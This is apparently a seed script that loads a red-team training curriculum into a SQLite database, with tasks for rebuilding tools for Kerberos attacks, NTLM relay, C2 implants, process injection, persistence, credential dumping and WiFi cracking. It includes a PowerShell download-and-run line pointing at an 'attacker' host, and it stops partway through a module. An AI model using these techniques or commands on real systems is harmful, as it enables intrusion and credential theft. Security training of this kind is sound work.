import Database from 'better-sqlite3';

const db = new Database('data/quest-log.db');

const insertModule = db.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = db.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);
const deleteModules = db.prepare('DELETE FROM modules WHERE path_id = ?');

const now = Date.now();

function expandPath(pathId: number, modules: { name: string; desc: string; tasks: [string, string, string][] }[]) {
	deleteModules.run(pathId);
	modules.forEach((mod, i) => {
		const m = insertModule.run(pathId, mod.name, mod.desc, i, now);
		mod.tasks.forEach(([title, desc, details], j) => {
			insertTask.run(m.lastInsertRowid, title, desc, details, j, now);
		});
	});
}

// Reimplement Red Team Tools: Network (61)
expandPath(61, [
	{ name: 'Network Reconnaissance', desc: 'Discovery and enumeration', tasks: [
		['Build network scanner', 'Discover live hosts using ICMP ping sweeps (ping -c 1 target), ARP scanning for local networks, and TCP connect scans to common ports like 22, 80, 443, 445. Example: scan 192.168.1.0/24 and identify which hosts respond.', '## Scanner\n\nPing sweep\nARP scan\nTCP connect scan'],
		['Implement service detection', 'Identify services by connecting to open ports and analyzing response banners. Example: connect to port 22 and parse "SSH-2.0-OpenSSH_8.2" to identify SSH version, or send HTTP requests to detect web server types like Apache/nginx.', '## Services\n\nConnect to ports\nSend probes\nIdentify services'],
		['Add DNS enumeration', 'Enumerate DNS using zone transfer attempts (AXFR), subdomain brute-forcing with wordlists (admin., dev., staging.), and record lookups for MX, TXT, CNAME, and SRV records to map the target infrastructure.', '## DNS\n\nSubdomain brute\nZone transfer attempt\nDNS record lookup'],
		['Build SNMP scanner', 'Test SNMP community strings like "public", "private", "community" on UDP 161. Walk MIB trees (1.3.6.1.2.1.1) to extract hostnames, interfaces, running processes, and installed software from network devices.', '## SNMP\n\nTest default communities\nWalk MIB tree\nExtract system info'],
		['Implement SMB enumeration', 'Connect to SMB (port 445) using null sessions to list shares (ADMIN$, C$, IPC$), enumerate domain users via RID cycling (500=Administrator, 1000+ users), and identify accessible file shares.', '## SMB\n\nList shares\nNull session enum\nUser enumeration'],
		['Add LDAP enumeration', 'Query LDAP (port 389/636) with anonymous or authenticated binds. Extract users (sAMAccountName, mail), groups (Domain Admins, Enterprise Admins), GPOs (displayName, gPCFileSysPath), and computer objects.', '## LDAP\n\nAnonymous bind\nUser/group enum\nGPO enumeration'],
	] as [string, string, string][] },
	{ name: 'Network Attacks', desc: 'Exploitation tools', tasks: [
		['Build ARP spoofer', 'Perform MITM by sending gratuitous ARP replies to poison victim ARP caches. Example: tell 192.168.1.100 that the gateway 192.168.1.1 is at attacker MAC, intercept traffic, then forward to real gateway to avoid detection.', '## ARP Spoof\n\nPoison ARP cache\nIntercept traffic\nForward packets'],
		['Implement packet capture', 'Use libpcap to capture traffic with BPF filters like "tcp port 21 or port 110" to extract FTP/POP3 credentials. Parse HTTP POST data for login forms, and extract NTLM hashes from SMB traffic.', '## Capture\n\nPcap library\nFilter traffic\nExtract credentials'],
		['Add password sprayer', 'Test one password against many accounts to avoid lockouts. Example: try "Winter2024!" against all domain users via SMB (port 445), LDAP bind, or Kerberos AS-REQ. Implement lockout-aware delays between attempts.', '## Sprayer\n\nSMB spray\nLDAP spray\nKerberos spray'],
		['Build relay tool', 'Capture NTLM Type 1/2/3 messages from one connection and relay them to another service. Example: victim connects to attacker SMB, attacker relays to target LDAP to add a computer account or modify ACLs.', '## Relay\n\nCapture NTLM\nRelay to target\nExecute commands'],
		['Implement coercer', 'Force Windows machines to authenticate to attacker using RPC calls. PrinterBug: MS-RPRN RpcRemoteFindFirstPrinterChangeNotification. PetitPotam: MS-EFSRPC EfsRpcOpenFileRaw. Combine with relay for exploitation.', '## Coercer\n\nPrinterbug\nPetitPotam\nDFSCoerce'],
		['Add Kerberos attacks', 'Kerberoast: find SPNs with LDAP, request TGS tickets, crack offline with hashcat -m 13100. AS-REP Roast: find users without preauth (UAC 0x400000), request AS-REP, crack with hashcat -m 18200.', '## Kerberos\n\nRequest TGTs\nCrack offline\nForge tickets'],
	] as [string, string, string][] },
]);

// Reimplement: Evil-WinRM & C2 (89)
expandPath(89, [
	{ name: 'WinRM Client', desc: 'PowerShell remoting', tasks: [
		['Implement WinRM protocol', 'Build HTTP(S) transport on ports 5985/5986 using SOAP envelopes. Construct WS-Management messages with proper headers (wsa:Action, wsa:To) and WSMAN shell operations (Create, Command, Receive, Delete).', '## WinRM\n\nHTTP on 5985\nHTTPS on 5986\nSOAP envelope format'],
		['Build shell interface', 'Create interactive PowerShell sessions that send commands, stream output in real-time, handle CLIXML error formatting, and support tab completion. Implement proper session cleanup on exit.', '## Shell\n\nSend commands\nReceive output\nHandle errors'],
		['Add file transfer', 'Upload files by Base64 encoding and writing via PowerShell: [IO.File]::WriteAllBytes(). Download by reading and encoding. Chunk large files (>1MB) to avoid memory issues. Show transfer progress.', '## Files\n\nBase64 encoding\nChunk large files\nStream transfer'],
		['Implement pass-the-hash', 'Authenticate with NTLM hash (aad3b435:31d6cfe0) instead of password by constructing NTLM Type 3 response directly from hash. No plaintext password needed for lateral movement.', '## PtH\n\nAuth with hash\nNo password needed'],
		['Build script execution', 'Load PowerShell scripts into memory using IEX (Invoke-Expression) or reflection. Bypass ExecutionPolicy with -ep bypass flag. Example: IEX(New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")', '## Scripts\n\nLoad scripts\nBypass execution policy\nIn-memory execution'],
		['Add Kerberos auth', 'Authenticate using Kerberos tickets (.kirbi files) for pass-the-ticket. Support S4U2Self/S4U2Proxy for constrained delegation abuse. Allow ccache file import for Linux interoperability.', '## Kerberos\n\nUse TGT/TGS\nPass-the-ticket\nS4U delegation'],
	] as [string, string, string][] },
	{ name: 'C2 Features', desc: 'Command and control', tasks: [
		['Build beacon client', 'Create agent with configurable sleep (e.g., 60s) and jitter (e.g., 20% = 48-72s actual). Check in via HTTP GET, receive tasking in response, execute, and POST results. Support sleep command to adjust intervals.', '## Beacon\n\nSleep interval\nJitter\nReceive tasks'],
		['Implement task queue', 'Queue commands (shell, upload, download, execute-assembly) with unique IDs. Track pending/running/completed status. Return structured results with stdout, stderr, exit code, and execution time.', '## Tasks\n\nQueue commands\nTrack execution\nReturn results'],
		['Add process injection', 'Inject shellcode using: 1) CreateRemoteThread with VirtualAllocEx, 2) QueueUserAPC for early bird injection, 3) NtMapViewOfSection for process hollowing. Target processes like explorer.exe, svchost.exe.', '## Injection\n\nInject into process\nHide execution\nBypass detection'],
		['Build lateral movement', 'Move laterally via: WMI Win32_Process.Create(), SMB PsExec-style service creation, WinRM New-PSSession, and DCOM MMC20.Application ExecuteShellCommand. Pass credentials or use current token.', '## Lateral\n\nWMI execution\nSMB execution\nPSRemoting'],
		['Implement persistence', 'Maintain access via: Registry Run keys (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run), Scheduled Tasks (schtasks /create), Services (sc create), and WMI event subscriptions.', '## Persistence\n\nRegistry\nScheduled tasks\nServices'],
		['Add credential harvesting', 'Extract creds: dump LSASS using MiniDumpWriteDump or comsvcs.dll, parse for NTLM/Kerberos. Read browser passwords from Chrome/Firefox SQLite DBs. Access Windows Credential Manager vault.', '## Creds\n\nMimikatz-style\nLSASS dump\nBrowser passwords'],
	] as [string, string, string][] },
]);

// Reimplement: Impacket Suite (87 - the second one)
expandPath(87, [
	{ name: 'Protocol Implementations', desc: 'Core protocols', tasks: [
		['Implement SMB2/3 client', 'Build SMB client handling: 1) Negotiate dialect (SMB 2.0.2, 2.1, 3.0, 3.1.1), 2) Session setup with NTLM/Kerberos, 3) Tree connect to shares (\\\\server\\share). Support signing and encryption.', '## SMB\n\nNegotiation\nSession setup\nTree connect'],
		['Build MSRPC layer', 'Implement DCE/RPC over SMB named pipes (\\pipe\\samr, \\pipe\\lsarpc). Handle bind requests with interface UUIDs, transfer syntax negotiation, and request/response marshalling using NDR format.', '## MSRPC\n\nNamed pipe transport\nInterface binding\nRequest/response'],
		['Add Kerberos client', 'Build AS-REQ/AS-REP for TGT requests (with password, hash, or certificate), TGS-REQ/TGS-REP for service tickets. Support encryption types: RC4-HMAC (23), AES128 (17), AES256 (18).', '## Kerberos\n\nAS-REQ/AS-REP\nTGS-REQ/TGS-REP\nEncryption types'],
		['Implement LDAP client', 'Build LDAP operations: simple bind (user/pass), SASL bind (GSSAPI for Kerberos), search with filters like (sAMAccountName=admin*), and modify operations for attribute changes.', '## LDAP\n\nBind operation\nSearch queries\nModify operations'],
		['Build NTLM client', 'Implement 3-message authentication: Type1 (negotiate flags, domain), Type2 (challenge, server info), Type3 (LM/NTLM response, session key). Support NTLMv1, NTLMv2, and NTLM signing/sealing.', '## NTLM\n\nNegotiate\nChallenge\nAuthenticate'],
		['Add WMI client', 'Connect via DCOM (port 135 + dynamic RPC). Query CIM classes like Win32_Process, Win32_Service. Call methods: Win32_Process::Create() for remote execution, Win32_Service::StartService().', '## WMI\n\nDCOM connection\nQuery classes\nMethod execution'],
	] as [string, string, string][] },
	{ name: 'Attack Tools', desc: 'Security tools', tasks: [
		['Build secretsdump', 'Extract: 1) SAM hashes via remote registry (HKLM\\SAM), 2) LSA secrets (service account passwords), 3) Cached domain creds (mscash2), 4) NTDS.dit via DCSync or VSS copy.', '## Secrets\n\nRemote registry\nSAM dump\nLSA secrets'],
		['Implement psexec', 'Create service remotely: 1) Upload executable to ADMIN$, 2) Create service via SVCCTL RPC, 3) Start service, 4) Capture output via named pipe. Clean up service/file afterward.', '## PSExec\n\nService creation\nCommand execution\nOutput capture'],
		['Add wmiexec', 'Execute via WMI Win32_Process.Create(). Redirect output to file on C$ share, read results, delete file. Semi-interactive shell. Stealthier than psexec (no service creation or file upload).', '## WMI\n\nWin32_Process.Create\nOutput via share\nStealthy execution'],
		['Build smbclient', 'Full SMB file operations: list shares (NetShareEnum), recursive directory listing, upload/download files with progress, delete files/directories. Support wildcards: get *.docx.', '## SMB Client\n\nList shares\nUpload/download\nDelete files'],
		['Implement GetNPUsers', 'Find users with "Do not require Kerberos preauthentication" via LDAP (userAccountControl & 0x400000). Send AS-REQ without preauth, extract encrypted timestamp for cracking (hashcat -m 18200).', '## AS-REP\n\nFind vulnerable users\nRequest AS-REP\nCrack offline'],
		['Add GetUserSPNs', 'Query LDAP for servicePrincipalName attributes on user accounts. Request TGS tickets for found SPNs, extract ticket encrypted with service account password hash for offline cracking (hashcat -m 13100).', '## Kerberoast\n\nFind SPNs\nRequest TGS\nCrack service passwords'],
	] as [string, string, string][] },
]);

// Reimplement: Pivoting & C2 (84)
expandPath(84, [
	{ name: 'Pivoting Techniques', desc: 'Network pivoting', tasks: [
		['Build SOCKS proxy', 'Implement SOCKS5 (RFC 1928) server supporting CONNECT command and optional username/password auth. Example: run on compromised host, proxychains through it to access internal 10.x.x.x networks from attacker machine.', '## SOCKS\n\nSOCKS5 server\nAuth support\nRoute through pivot'],
		['Implement port forwarding', 'Local forward (-L 8080:internal:80): listen locally, connect to internal. Remote forward (-R 4444:localhost:4444): expose local service on pivot. Dynamic (-D 1080): SOCKS proxy through tunnel.', '## Forwards\n\nLocal forward\nRemote forward\nDynamic forward'],
		['Add chisel-like tunnel', 'Build HTTP tunnel using WebSocket upgrade for bidirectional communication. Encapsulate TCP in HTTP to bypass firewalls allowing only port 80/443. Support reverse mode where client connects out.', '## HTTP Tunnel\n\nTunnel over HTTP\nFirewall bypass\nWebSocket support'],
		['Build multi-hop pivot', 'Chain pivots: Attacker → Host A → Host B → Target. Nest tunnels or use ProxyJump-style routing. Manage routes so traffic to 10.1.0.0/16 goes through Host A, 10.2.0.0/16 through Host B.', '## Multi-Hop\n\nPivot through multiple hosts\nNested tunnels\nRoute management'],
		['Implement VPN-like mode', 'Create TUN interface (tap0/tun0) on both ends. Route entire subnets (ip route add 10.0.0.0/8 via tun0). Apps use VPN transparently without SOCKS configuration. Similar to ligolo-ng.', '## VPN\n\nTUN interface\nRoute entire subnet\nTransparent access'],
		['Add DNS tunneling', 'Encode data in DNS queries (data.tunnel.attacker.com → TXT response). 63-byte label limit, ~500 bps. Use when only DNS (port 53) is allowed outbound. Tools like iodine, dnscat2 for reference.', '## DNS\n\nEncode in queries\nSlow but covert\nFirewall bypass'],
	] as [string, string, string][] },
	{ name: 'C2 Infrastructure', desc: 'Command and control', tasks: [
		['Design C2 protocol', 'Define: 1) Encryption (AES-256-GCM + RSA key exchange), 2) Authentication (implant registration with unique keys), 3) Message format (JSON with cmd, args, id fields), 4) Transport (HTTP headers, cookies, or body).', '## Protocol\n\nEncryption\nAuthentication\nCommand format'],
		['Build implant', 'Create agent with: task handlers (shell, file ops, screenshot), result queue with retry logic, anti-forensics (timestomping, log clearing), and sleep with jitter. Cross-compile for Windows/Linux/macOS.', '## Implant\n\nTask execution\nResult return\nStealth features'],
		['Implement server', 'Build server with: multiple listeners (HTTP/HTTPS/DNS/SMB), SQLite database for implants/tasks/loot, REST API for operators, and real-time updates via WebSocket. Example: Flask + SQLAlchemy backend.', '## Server\n\nListener management\nImplant tracking\nOperator interface'],
		['Add redirectors', 'Hide C2 using: 1) Domain fronting (connect to cdn.example.com, Host: c2.attacker.com), 2) Apache mod_rewrite to filter requests, 3) Cloudflare Workers for request forwarding. Rotate domains.', '## Redirectors\n\nHide real C2\nDomain fronting\nHTTP redirects'],
		['Build payload generator', 'Generate implants with embedded config (C2 URL, sleep time, jitter, kill date). Apply obfuscation: string encryption, control flow flattening, API hashing. Output as EXE, DLL, shellcode, or script.', '## Generator\n\nConfigure implant\nEmbed config\nObfuscation'],
		['Implement team collaboration', 'Multi-operator support: user authentication, shared implant sessions, role-based permissions (admin/operator/viewer), comprehensive event logging, and credential/loot sharing between operators.', '## Team\n\nShared sessions\nRole-based access\nEvent logging'],
	] as [string, string, string][] },
]);

// Reimplement: Rubeus (63)
expandPath(63, [
	{ name: 'Ticket Operations', desc: 'Kerberos ticket handling', tasks: [
		['Request TGT', 'Send AS-REQ to KDC (port 88) using: 1) password (derive AES key with string2key), 2) NTLM hash (RC4 encryption), or 3) PKCS12 certificate (PKINIT). Parse AS-REP to extract encrypted TGT.', '## TGT Request\n\nAS-REQ with password\nAS-REQ with hash\nAS-REQ with certificate'],
		['Request TGS', 'Send TGS-REQ with TGT to obtain service tickets. Specify SPN like HTTP/web.domain.com. Support S4U2Self (get ticket for any user to self), S4U2Proxy (forward ticket to another service).', '## TGS Request\n\nService ticket for SPN\nS4U2Self\nS4U2Proxy'],
		['Implement pass-the-ticket', 'Inject tickets into LSASS using LsaCallAuthenticationPackage or sekurlsa::pth. Import .kirbi/.ccache files. Use injected tickets for SMB, LDAP, HTTP authentication to domain resources.', '## PTT\n\nInject into memory\nUse for authentication\nCross-realm'],
		['Build ticket renewal', 'Extract renew-till time from ticket. Before expiry, send TGS-REQ with RENEW flag to extend lifetime. Default max renewal: 7 days. Maintain persistent access without re-authentication.', '## Renewal\n\nRenew before expiry\nMaintain access\nMaximum lifetime'],
		['Add ticket export', 'Dump tickets from LSASS memory using sekurlsa::tickets. Export as .kirbi (Windows) or .ccache (Linux) format. Extract from credential cache: klist, Rubeus dump, or mimikatz.', '## Export\n\nDump from memory\nSave to file\nKirbi format'],
		['Implement ticket parsing', 'Decode ASN.1 ticket structure. Display: service principal, encryption type, start/end/renew times. Parse PAC for user SID, group memberships, privileges. Validate signatures.', '## Parse\n\nDecode ticket\nShow PAC info\nExpiry times'],
	] as [string, string, string][] },
	{ name: 'Kerberos Attacks', desc: 'Attack techniques', tasks: [
		['Build Kerberoasting', 'Query LDAP for user accounts with servicePrincipalName. Request TGS for each SPN. Extract ticket (encrypted with service account password). Crack with hashcat -m 13100 using wordlists.', '## Kerberoast\n\nFind SPNs\nRequest TGS\nExtract for cracking'],
		['Implement AS-REP roasting', 'Find users with DONT_REQUIRE_PREAUTH (UAC 0x400000) via LDAP. Send AS-REQ without pre-auth timestamp. Extract encrypted timestamp from AS-REP. Crack with hashcat -m 18200.', '## AS-REP\n\nFind vulnerable users\nRequest AS-REP\nCrack password hash'],
		['Add overpass-the-hash', 'Convert NTLM hash to Kerberos TGT: use hash as RC4 key in AS-REQ pre-auth. Result: valid TGT usable for any Kerberos auth. Stealthier than pass-the-hash (no NTLM traffic).', '## OverPTH\n\nNTLM hash to TGT\nUse for authentication\nStealth movement'],
		['Build unconstrained delegation', 'Find computers with TRUSTED_FOR_DELEGATION. When users connect (e.g., admin RDPs in), their TGT is cached. Extract with sekurlsa::tickets. Coerce auth with PrinterBug to capture DC TGT.', '## Unconstrained\n\nMonitor for TGTs\nCapture admin tickets\nImpersonate users'],
		['Implement constrained delegation', 'Find accounts with msDS-AllowedToDelegateTo. Use S4U2Self to get ticket for any user, S4U2Proxy to forward to allowed service. Can request ticket for alternate SPN (HTTP→CIFS).', '## Constrained\n\nS4U2Self for ticket\nS4U2Proxy to target\nAlternate service name'],
		['Add resource-based delegation', 'If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on target, add attacker computer SID. Use S4U2Self+S4U2Proxy from attacker account to impersonate admin to target. No SeEnableDelegation needed.', '## RBCD\n\nModify msDS-AllowedToActOnBehalfOfOtherIdentity\nS4U chain\nPrivilege escalation'],
	] as [string, string, string][] },
]);

// Reimplement Red Team Tools: Web & AD (82)
expandPath(82, [
	{ name: 'Web Attack Tools', desc: 'Web application testing', tasks: [
		['Build directory bruteforcer', 'Enumerate URIs using wordlists (dirbuster, SecLists). Filter by status code (200, 301, 403), response size, or content. Recurse into found directories. Example: find /admin/, /backup/, /.git/ directories.', '## Dirbusting\n\nWordlist enumeration\nFilter responses\nRecursive scanning'],
		['Implement parameter fuzzer', 'Discover hidden GET/POST parameters by fuzzing names (debug, admin, test) and values. Detect reflected input, error changes, or timing differences. Example: find ?debug=1 enables debug mode.', '## Param Fuzz\n\nFuzz parameter names\nFuzz values\nDetect vulns'],
		['Add XSS scanner', 'Detect XSS by: 1) Identifying context (HTML body, attribute, JS string), 2) Generating context-appropriate payloads (<script>, "onclick=, \';alert()), 3) Checking if payload executes unfiltered.', '## XSS\n\nContext detection\nPayload generation\nReflection checking'],
		['Build SQLi scanner', 'Detect SQLi: Error-based (\'syntax error), Boolean-blind (id=1 AND 1=1 vs 1=2), Time-based (SLEEP(5)). Extract data: database(), user(), tables via UNION or blind extraction one character at a time.', '## SQLi\n\nError-based\nBlind boolean\nTime-based'],
		['Implement subdomain enum', 'Discover subdomains via: 1) DNS brute force with wordlists (dev, staging, api), 2) Certificate Transparency logs (crt.sh), 3) Web archives (archive.org), 4) DNS zone transfer if allowed.', '## Subdomains\n\nDNS brute force\nCertificate transparency\nArchive search'],
		['Add credential sprayer', 'Spray credentials against: login forms (parse CSRF tokens), OAuth/OIDC endpoints, O365/Azure AD. Handle rate limits with delays and IP rotation. Detect lockout policies (5 attempts/30 min).', '## Spray\n\nLogin form spray\nOAuth spray\nRate limit handling'],
	] as [string, string, string][] },
	{ name: 'AD Attack Tools', desc: 'Active Directory attacks', tasks: [
		['Build BloodHound ingestor', 'Collect AD data: users/groups/computers via LDAP, local admin sessions via NetSessionEnum, ACLs on objects. Output BloodHound-compatible JSON. Query for attack paths like "Shortest path to Domain Admin".', '## BloodHound\n\nLDAP queries\nSession enum\nACL collection'],
		['Implement DCSync', 'Replicate credentials using DRSUAPI RPC with GetNCChanges. Requires Replicating Directory Changes rights (Domain Admins, DCs). Extract all NTLM hashes from NTDS.dit without touching the DC filesystem.', '## DCSync\n\nDRSGetNCChanges\nReplicate secrets\nNTDS extraction'],
		['Add GPO abuse', 'Find writable GPOs via ACL enumeration. Modify GPO to: add scheduled task running as SYSTEM, deploy malicious MSI, create local admin user. Changes apply at next gpupdate (90 min default).', '## GPO\n\nFind writable GPOs\nAdd scheduled task\nDeploy malware'],
		['Build delegation abuse', 'Find: unconstrained (TRUSTED_FOR_DELEGATION), constrained (msDS-AllowedToDelegateTo), RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity). Exploit to impersonate users and access resources.', '## Delegation\n\nFind delegation\nAbuse unconstrained\nRBCD attack'],
		['Implement ADCS attacks', 'ESC1: template allows SAN, attacker requests cert as admin. ESC4: modify template. ESC8: relay NTLM to CA web enrollment. Use Certipy to find misconfigs, request certs, authenticate with PKINIT.', '## ADCS\n\nESC1-ESC8\nTemplate abuse\nCertificate theft'],
		['Add persistence mechanisms', 'Golden ticket: forge TGT with krbtgt hash (10-year validity). Silver ticket: forge TGS with service hash. Skeleton key: patch LSASS on DC, any password works. AdminSDHolder: backdoor admin groups.', '## Persistence\n\nGolden ticket\nSilver ticket\nSkeleton key'],
	] as [string, string, string][] },
]);

// Reimplement: Complete Aircrack-ng Suite (88)
expandPath(88, [
	{ name: 'Wireless Capture', desc: 'Packet capture', tasks: [
		['Set up monitor mode', 'Put interface in monitor mode: airmon-ng start wlan0. This enables capturing all 802.11 frames (not just those for your MAC). Channel hop with airodump-ng or lock to specific channel for targeted capture.', '## Monitor Mode\n\nairmon-ng start wlan0\nCapture all frames\nChannel hopping'],
		['Build packet capture', 'Capture with filters: airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon. Writes to capture-01.cap. Parse pcap format (libpcap), extract 802.11 headers, data frames, and management frames.', '## Capture\n\nCapture to pcap\nFilter by BSSID\nFilter by channel'],
		['Implement deauth attack', 'Send forged deauth frames: aireplay-ng -0 5 -a <BSSID> -c <client> wlan0mon. This disconnects clients, forcing them to reconnect and capture 4-way handshake. Use sparingly to avoid detection.', '## Deauth\n\nForge deauth frames\nDisconnect clients\nCapture handshakes'],
		['Add beacon injection', 'Create fake AP: airbase-ng -e "FreeWifi" -c 6 wlan0mon. For evil twin: clone target SSID, higher signal strength wins. Captive portal captures credentials when victims try to browse.', '## Beacon\n\nCreate fake AP\nEvil twin attack\nCapture credentials'],
		['Build handshake capture', 'Capture EAPOL 4-way handshake: M1 (ANonce from AP), M2 (SNonce from client), M3, M4. Need at least M1+M2 or M2+M3 to crack. Verify with aircrack-ng -w - capture.cap (shows if handshake present).', '## Handshake\n\nCapture EAPOL frames\nDeauth to trigger\nVerify handshake'],
		['Implement PMKID capture', 'Extract PMKID from first message of handshake (RSN IE in beacon/association). No client needed: hcxdumptool -i wlan0mon -o output.pcapng. PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AA || SPA).', '## PMKID\n\nCapture from AP\nNo client needed\nFaster attack'],
	] as [string, string, string][] },
	{ name: 'Password Cracking', desc: 'Offline attacks', tasks: [
		['Build WPA cracker', 'Derive PMK from password: PBKDF2-SHA1(password, SSID, 4096, 256). Derive PTK, compute MIC, compare to captured MIC. ~2000 passwords/sec on CPU. Example: aircrack-ng -w wordlist.txt capture.cap.', '## WPA Crack\n\nParse handshake\nHash with PBKDF2\nCompare PMK'],
		['Implement PMKID cracker', 'Convert capture: hcxpcapngtool -o hash.22000 capture.pcapng. Crack with hashcat: hashcat -m 22000 hash.22000 wordlist.txt. Faster than handshake: no client needed, single hash to crack.', '## PMKID Crack\n\nExtract PMKID\nHashcat mode 16800\nFaster than WPA'],
		['Add rule-based cracking', 'Apply rules to wordlist: hashcat -r rules/best64.rule. Examples: $1 (append 1), c (capitalize), r (reverse). Combines with wordlist: "password" → "Password1", "1drowssap". 10x more candidates.', '## Rules\n\nHashcat rules\nWord variations\nEfficient cracking'],
		['Build WEP cracker', 'Collect weak IVs: aireplay-ng -3 -b <BSSID> wlan0mon (ARP replay). PTW attack needs ~40k packets. aircrack-ng -z capture.cap uses PTW. Fragmentation attack for faster IV generation.', '## WEP\n\nCollect IVs\nPTW attack\nFragmentation attack'],
		['Implement GPU acceleration', 'Use hashcat with GPU: hashcat -m 22000 -d 1 hash.22000 wordlist.txt. RTX 3090: ~1.2M WPA hashes/sec vs ~2K on CPU. Requires CUDA (NVIDIA) or OpenCL (AMD). 600x faster than CPU.', '## GPU\n\nHashcat integration\nCUDA/OpenCL\nMassive speedup'],
		['Add distributed cracking', 'Split keyspace: hashcat --skip N --limit M or use hashtopolis. Example: 4 machines each crack 25% of keyspace. Coordinate via central server, aggregate found passwords. Linear speedup with node count.', '## Distributed\n\nSplit workload\nCoordinate nodes\nAggregate results'],
	] as [string, string, string][] },
]);

// Reimplement: Password & WiFi Cracking (83)
expandPath(83, [
	{ name: 'Password Cracking', desc: 'Offline hash cracking', tasks: [
		['Implement hash identification', 'Detect type by: length (32=MD5, 40=SHA1, 64=SHA256), format ($1$=MD5crypt, $6$=SHA512crypt), prefix (NTLM: 32 hex, bcrypt: $2a$). Use hashid or hash-identifier tools as reference.', '## Identification\n\nByLength, format\nMagic numbers\nContext clues'],
		['Build dictionary attack', 'Load wordlist (rockyou.txt: 14M passwords). Hash each candidate, compare to target. Example: hashcat -m 0 -a 0 hash.txt rockyou.txt. Track progress, checkpoint for resume, show ETA.', '## Dictionary\n\nLoad wordlist\nHash and compare\nProgress tracking'],
		['Add mask attack', 'Define pattern: ?l=a-z, ?u=A-Z, ?d=0-9, ?s=special. Example: ?u?l?l?l?d?d?d = "Pass123". Increment: -i --increment-min=6 --increment-max=10. Custom charset: -1 abc ?1?1?1.', '## Mask\n\n?l?u?d?s\nCustom charsets\nIncremental lengths'],
		['Implement rule engine', 'Apply transformations: c=capitalize, $1=append 1, ^!=prepend !, r=reverse, sa@=replace a with @. Example: "password" + rules → "Password1!", "P@ssword", "DROWSSAP". Chains: hashcat -r rule1 -r rule2.', '## Rules\n\nJohn/Hashcat rules\nCombine with wordlist\nMultiple rules'],
		['Build hybrid attack', 'Wordlist + mask: hashcat -a 6 wordlist.txt ?d?d?d (append 3 digits). Or -a 7 ?s?s wordlist.txt (prepend 2 special). Example: "password" → "password123", "!!password". More efficient than pure brute force.', '## Hybrid\n\nBase word + pattern\nWord + digits\nEfficient approach'],
		['Add markov chains', 'Train on leaked passwords to learn character transition probabilities. Generate candidates in probability order (most likely first). hashcat: --markov-threshold. 3-5x faster than random brute force.', '## Markov\n\nLearn from passwords\nGenerate likely guesses\nFaster than brute'],
	] as [string, string, string][] },
	{ name: 'WiFi Cracking', desc: 'Wireless attacks', tasks: [
		['Capture WPA handshake', 'Monitor mode: airmon-ng start wlan0. Capture: airodump-ng -c 6 -w cap wlan0mon. Deauth to trigger: aireplay-ng -0 1 -a BSSID wlan0mon. Verify handshake captured in cap-01.cap.', '## Capture\n\nMonitor mode\nDeauth clients\nCapture EAPOL'],
		['Implement WPA cracking', 'PMK = PBKDF2(password, SSID, 4096, 256). PTK derives from PMK + nonces. Compute MIC, compare to captured. GPU: hashcat -m 22000 at ~600K/s on RTX 3090 vs ~2K/s on CPU.', '## WPA Crack\n\nPBKDF2-SHA1\nCompare to MIC\nGPU acceleration'],
		['Add PMKID attack', 'Capture PMKID from first EAPOL message (no client needed): hcxdumptool -i wlan0mon -o cap.pcapng. Convert: hcxpcapngtool -o hash.22000 cap.pcapng. Crack: hashcat -m 22000.', '## PMKID\n\nExtract from beacon\nNo handshake needed\nFaster attack'],
		['Build rainbow tables', 'Pre-compute PMKs for common SSIDs (linksys, NETGEAR, default). Store PMK→password mapping. Lookup is instant (milliseconds). Trade-off: 1TB can cover top 1000 SSIDs with 10M passwords each.', '## Rainbow\n\nPre-compute for SSIDs\nInstant lookup\nStorage tradeoff'],
		['Implement WEP cracking', 'Collect IVs with ARP replay: aireplay-ng -3 -b BSSID wlan0mon. Need ~40K packets for PTW attack. Crack: aircrack-ng -z capture.cap. WEP uses RC4, weak IVs reveal key bytes statistically.', '## WEP\n\nCollect IVs\nStatistical attack\nPTW method'],
		['Add online attacks', 'WPS brute force: reaver -i wlan0mon -b BSSID (11K PINs max). Pixie dust: reaver -K 1 (exploits weak random). Try defaults: admin/admin, password, 12345678. Check router model for known passwords.', '## Online\n\nWPS brute force\nPixie dust\nDefault passwords'],
	] as [string, string, string][] },
]);

// Red Team Tooling: C/C++ Fundamentals (52)
expandPath(52, [
	{ name: 'C/C++ Basics', desc: 'Language fundamentals', tasks: [
		['Set up development environment', 'Install Visual Studio with C++ workload or MinGW-w64. Configure CMakeLists.txt: cmake_minimum_required, project(), add_executable(). Set up WinDbg or GDB for debugging, configure symbols.', '## Setup\n\nVisual Studio or MinGW\nCMake for builds\nDebugger setup'],
		['Learn memory management', 'Understand: stack (local vars), heap (malloc/new), pointers (*ptr dereference, &var address). malloc(size)/free(ptr), new/delete. Memory layout: .text, .data, .bss, heap, stack. Avoid leaks and use-after-free.', '## Memory\n\nmalloc/free\nnew/delete\nMemory layout'],
		['Implement file operations', 'FILE* fp = fopen("file", "rb"); fread(buf, 1, size, fp); fclose(fp). Binary mode for shellcode. Memory mapping: CreateFileMapping + MapViewOfFile (Win) or mmap (Linux) for large files.', '## Files\n\nfopen, fread, fwrite\nBinary file handling\nMemory mapping'],
		['Add socket programming', 'Winsock: WSAStartup, socket(AF_INET, SOCK_STREAM, 0), connect/bind/listen/accept, send/recv. BSD similar without WSA. Build TCP client: connect to C2. TCP server: bind port, accept shells.', '## Sockets\n\nWinsock/BSD sockets\nTCP/UDP\nClient/server'],
		['Build process operations', 'CreateProcess(NULL, "cmd.exe", ...) to spawn processes. OpenProcess with PROCESS_ALL_ACCESS. VirtualAllocEx/WriteProcessMemory for injection. DuplicateHandle for handle manipulation.', '## Processes\n\nCreateProcess\nProcess injection\nHandle manipulation'],
		['Implement threading', 'CreateThread(NULL, 0, ThreadFunc, param, 0, &tid). Sync: CreateMutex, WaitForSingleObject, CreateEvent. Thread pool: QueueUserWorkItem or C++11 std::async. Avoid race conditions.', '## Threads\n\nCreateThread\nSynchronization\nThread pools'],
	] as [string, string, string][] },
	{ name: 'Offensive C/C++', desc: 'Security applications', tasks: [
